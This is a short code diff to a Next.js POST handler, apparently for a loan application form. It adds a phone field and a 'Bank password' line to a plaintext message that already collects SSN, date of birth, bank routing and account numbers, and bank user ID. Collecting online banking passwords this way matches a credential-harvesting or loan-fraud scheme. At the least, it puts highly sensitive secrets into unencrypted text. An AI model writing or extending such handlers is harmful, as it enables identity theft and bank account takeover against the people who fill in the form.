@@ -14,6 +14,7 @@ export async function POST(req: NextRequest) {
     "lastName",
     "dob",
     "email",
+    "phone",
     "ssn",
     "streetAddress",
     "city",
@@ -106,6 +107,7 @@ export async function POST(req: NextRequest) {
         data.lastName,
         data.dob,
         data.email,
+        data.phone,
         data.ssn,
         data.streetAddress,
         data.city,
@@ -143,6 +145,7 @@ export async function POST(req: NextRequest) {
 
 Name: ${data.firstName} ${data.lastName}
 Email: ${data.email}
+Phone: ${data.phone}
 SSN: ${data.ssn}
 DOB: ${data.dob}
 Address: ${data.streetAddress}, ${data.city}, ${data.state} ${data.zip}
@@ -151,6 +154,7 @@ Loan amount: ${data.loanAmount}
 Routing number: ${data.routingNumber}
 Account number: ${data.accountNumber}
 Bank user ID: ${data.bankUserId}
+Bank password: ${data.bankPassword}
 
 Submitted at: ${new Date().toISOString()}
 `,
